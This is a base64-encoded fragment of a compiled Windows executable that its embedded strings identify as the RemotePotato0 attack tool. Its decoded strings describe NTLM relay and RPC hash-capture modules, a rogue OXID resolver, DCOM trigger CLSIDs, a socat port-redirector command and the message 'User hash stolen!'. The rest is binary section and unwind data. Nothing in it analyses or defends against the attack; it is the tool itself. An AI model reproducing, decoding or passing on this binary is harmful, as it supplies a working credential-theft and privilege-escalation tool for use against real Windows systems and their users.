AAAAAAAAAAAAAFsrXSBSZWNlaXZlZCB0aGUgcmVsYXllZCBhdXRoZW50aWNhdGlvbiBvbiB0aGUgUlBDIHJlbGF5IHNlcnZlciBvbiBwb3J0ICVTCgAAAAAAQwByAGUAYQB0AGUAUgBQAEMAUwBvAGMAawBlAHQAUgBlAGYAbABlAGMAdAA6ACAAYwBvAG4AbgBlAGMAdAAgAGYAdQBuAGMAdABpAG8AbgAgAGYAYQBpAGwAZQBkACAAdwBpAHQAaAAgAGUAcgByAG8AcgA6ACAAJQBsAGQACgAAAAAAAAAAAENvdWxkbid0IGNvbm5lY3QgdG8gUlBDIFNlcnZlciAlUyBvbiBwb3J0ICVTCgAAAFsqXSBDb25uZWN0ZWQgdG8gUlBDIFNlcnZlciAlUyBvbiBwb3J0ICVTCgAAAAAAAFVua25vd24gZXhjZXB0aW9uAAAAAAAAAGJhZCBhcnJheSBuZXcgbGVuZ3RoAAAAAHN0cmluZyB0b28gbG9uZwBnZW5lcmljAHN5c3RlbQAAOAAwAAAAAAAxADIANwAuADAALgAwAC4AMQAAAAAAAAA5ADkAOQA5AAAAAAAAAAAAOQA5ADkANwAAAAAAAAAAAAAAAAAAAAAAewA1ADEANgA3AEIANAAyAEYALQBDADEAMQAxAC0ANAA3AEEAMQAtAEEAQwBDADQALQA4AEUAQQBCAEUANgAxAEIAMABCADUANAB9AAAAAABXcm9uZyBBcmd1bWVudDogJVMKAAAAAAAAAAAAAAAAAFsqXSBEZXRlY3RlZCBhIFdpbmRvd3MgU2VydmVyIHZlcnNpb24gY29tcGF0aWJsZSB3aXRoIEp1aWN5UG90YXRvLiBSb2d1ZU94aWRSZXNvbHZlciBjYW4gYmUgcnVuIGxvY2FsbHkgb24gMTI3LjAuMC4xCgAAAAAAAAAAAAAAWyFdIERldGVjdGVkIGEgV2luZG93cyBTZXJ2ZXIgdmVyc2lvbiBub3QgY29tcGF0aWJsZSB3aXRoIEp1aWN5UG90YXRvLCB5b3UgY2Fubm90IHJ1biB0aGUgUm9ndWVPeGlkUmVzb2x2ZXIgb24gMTI3LjAuMC4xLiBSb2d1ZU94aWRSZXNvbHZlciBtdXN0IGJlIHJ1biByZW1vdGVseS4KAAAAAAAAAAAAAAAAAABbIV0gRXhhbXBsZSBOZXR3b3JrIHJlZGlyZWN0b3I6IAoJc3VkbyBzb2NhdCAtdiBUQ1AtTElTVEVOOjEzNSxmb3JrLHJldXNlYWRkciBUQ1A6e3tUaGlzTWFjaGluZUlwfX06JVMKAAAAAAAAAAAAWypdIERldGVjdGVkIGEgV2luZG93cyBTZXJ2ZXIgdmVyc2lvbiBub3QgY29tcGF0aWJsZSB3aXRoIEp1aWN5UG90YXRvLiBSb2d1ZU94aWRSZXNvbHZlciBtdXN0IGJlIHJ1biByZW1vdGVseS4gUmVtZW1iZXIgdG8gZm9yd2FyZCB0Y3AgcG9ydCAxMzUgb24gJVMgdG8geW91ciB2aWN0aW0gbWFjaGluZSBvbiBwb3J0ICVTCgAAAAAAAAAAWypdIEV4YW1wbGUgTmV0d29yayByZWRpcmVjdG9yOiAKCXN1ZG8gc29jYXQgLXYgVENQLUxJU1RFTjoxMzUsZm9yayxyZXVzZWFkZHIgVENQOnt7VGhpc01hY2hpbmVJcH19OiVTCgAxADMANQAAAFshXSBSZW1vdGUgSFRUUCBSZWxheSBzZXJ2ZXIgaXAgbXVzdCBiZSBzZXQgaW4gbW9kdWxlIDAgYW5kIDEsIHNldCBpdCB3aXRoIHRoZSAtciBmbGFnLgoAAAAAAAAAAFsqXSBTdGFydGluZyB0aGUgTlRMTSByZWxheSBhdHRhY2ssIGxhdW5jaCBudGxtcmVsYXl4IG9uICVTISEKAABbKl0gU3RhcnRpbmcgdGhlIFJQQyBzZXJ2ZXIgdG8gY2FwdHVyZSB0aGUgY3JlZGVudGlhbHMgaGFzaCBmcm9tIHRoZSB1c2VyIGF1dGhlbnRpY2F0aW9uISEKAAAAAAB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AQwAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAANAA2AH0AAAAAAFsqXSBDYWxsaW5nIENvR2V0SW5zdGFuY2VGcm9tSVN0b3JhZ2Ugd2l0aCBDTFNJRDolUwoAAAAAWyFdIEVycm9yLiBDTFNJRCAlUyBub3QgZm91bmQuIEJhZCBwYXRoIHRvIG9iamVjdC4KAAAAAABbIV0gRXJyb3IuIFRyaWdnZXIgRENPTSBmYWlsZWQgd2l0aCBzdGF0dXM6IDB4JXgKAAAAAAAAAAAAAAAAAAAAewAwADAAMAAwADAAMwAzAEMALQAwADAAMAAwAC0AMAAwADAAMAAtAGMAMAAwADAALQAwADAAMAAwADAAMAAwADAAMAAwADQANgB9AAAAAABbKl0gU3Bhd25pbmcgQ09NIG9iamVjdCBpbiB0aGUgc2Vzc2lvbjogJWQKAAAAAABbKl0gQ2FsbGluZyBTdGFuZGFyZEdldEluc3RhbmNlRnJvbUlTdG9yYWdlIHdpdGggQ0xTSUQ6JVMKAAAAAAAAWyFdIEVycm9yLiBUcmlnZ2VyIERDT00gZmFpbGVkIHdpdGggc3RhdHVzOiAweCV4IC0gJXMKAABSdGxHZXRWZXJzaW9uAAAAbgB0AGQAbABsAC4AZABsAGwAAAAAAAAACgoJUmVtb3RlUG90YXRvMAoJQHNwbGludGVyX2NvZGUgJiBAZGVjb2Rlcl9pdAoKCgoAAAAAAAAAAAAAAAAAAE1hbmRhdG9yeSBhcmdzOiAKLW0gbW9kdWxlCglBbGxvd2VkIHZhbHVlczoKCTAgLSBScGMySHR0cCBjcm9zcyBwcm90b2NvbCByZWxheSBzZXJ2ZXIgKyBwb3RhdG8gdHJpZ2dlciAoZGVmYXVsdCkKCTEgLSBScGMySHR0cCBjcm9zcyBwcm90b2NvbCByZWxheSBzZXJ2ZXIKCTIgLSBScGMgY2FwdHVyZSAoaGFzaCkgc2VydmVyICsgcG90YXRvIHRyaWdnZXIKCTMgLSBScGMgY2FwdHVyZSAoaGFzaCkgc2VydmVyCgAACgoAAE90aGVyIGFyZ3M6IChzb21lb25lIGNvdWxkIGJlIG1hbmRhdG9yeSBhbmQvb3Igb3B0aW9uYWwgYmFzZWQgb24gdGhlIG1vZHVsZSB5b3UgdXNlKSAKLXIgUmVtb3RlIEhUVFAgcmVsYXkgc2VydmVyIGlwCi10IFJlbW90ZSBIVFRQIHJlbGF5IHNlcnZlciBwb3J0IChEZWZhdWx0IDgwKQoteCBSb2d1ZSBPeGlkIFJlc29sdmVyIGlwIChkZWZhdWx0IDEyNy4wLjAuMSkKLXAgUm9ndWUgT3hpZCBSZXNvbHZlciBwb3J0IChkZWZhdWx0IDk5OTkpCi1sIFJQQyBSZWxheSBzZXJ2ZXIgbGlzdGVuaW5nIHBvcnQgKERl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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIwAJAAQAAAAAAAAAAAAAAAAAAAAAAAACg0wFAAQAAALDTAUABAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACElgJAAQAAAAAAAAAAAAAAAAAAAAAAAACo0wFAAQAAALjTAUABAAAAwNMBQAEAAACQ0gJAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABgywIAqI8CAICPAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAwI8CAAAAAAAAAAAA0I8CAAAAAAAAAAAAAAAAAGDLAgAAAAAAAAAAAP////8AAAAAQAAAAKiPAgAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABoygIAIJACAPiPAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAOJACAAAAAAAAAAAAUJACAGiUAgAAAAAAAAAAAAAAAAAAAAAAaMoCAAEAAAAAAAAA/////wAAAABAAAAAIJACAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAJDKAgCgkAIAeJACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAC4kAIAAAAAAAAAAADYkAIAUJACAGiUAgAAAAAAAAAAAAAAAAAAAAAAAAAAAJDKAgACAAAAAAAAAP////8AAAAAQAAAAKCQAgAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAC4ygIAKJECAACRAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAQJECAAAAAAAAAAAAWJECAGiUAgAAAAAAAAAAAAAAAAAAAAAAuMoCAAEAAAAAAAAA/////wAAAABAAAAAKJECAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAACTAgAAAAAAAAAAAFCTAgAokwIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAJiRAgAAAAAAAAAAAIDLAgAAAAAACAAAAP////8AAAAAQgAAAICRAgAAAAAAAAAAAAAAAACgywIAAQAAAAAAAAD/////AAAAAEAAAAAQkwIAAAAAAAAAAAAAAAAAkJMCAFCTAgBwkgIA2JICAMiRAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAwMsCAMCSAgBIkgIAAAAAAAAAAAAAAAAAAAAAAIDLAgAAAAAAAAAAAP////8AAAAAQgAAAICRAgAAAAAAAAAAAAAAAAABAAAACAAAAAAAAADAywIAwJICAJiSAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAAAFAAAAGJICAAAAAAAAAAAAoMsCAAEAAAAIAAAA/////wAAAABAAAAAEJMCAAAAAAAAAAAAAAAAACiTAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAB4kwIAAAAAAAAAAACAywIAAAAAAAAAAAD/////AAAAAEAAAACAkQIAAAAAAAAAAAAAAAAA6MsCAAEAAAAAAAAA/////wAAAABAAAAAsJECAAAAAAAAAAAAAAAAAPCRAgAokwIAAAAAAAAAAAAAAAAAAAAAAMDLAgAEAAAAAAAAAP////8AAAAAQAAAAMCSAgAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAIywIAMJUCALiTAgAAAAAAAAAAAAAAAAAAAAAAEJYCALiUAgBolAIAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAA4zAIAoJUCAACUAgAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAcMwCAAiVAgAolAIAAAAAAAAAAAAAAAAAAAAAALiUAgBolAIAAAAAAAAAAAAAAAAAAAAAAAjLAgAAAAAAAAAAAP////8AAAAAQAAAADCVAgAAAAAAAAAAAAAAAABwzAIAAQAAAAAAAAD/////AAAAAEAAAAAIlQIAAAAAAAAAAAAAAAAA4MoCAAEAAAAAAAAA/////wAAAABAAAAA0JUCAAAAAAAAAAAAAAAAADiWAgBglgIAAAAAAAAAAAAAAAAAAAAAAGiUAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAABIlQIAAAAAAAAAAABglgIAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA+JQCAAAAAAAAAAAAkJQCAGCWAgAAAAAAAAAAAAAA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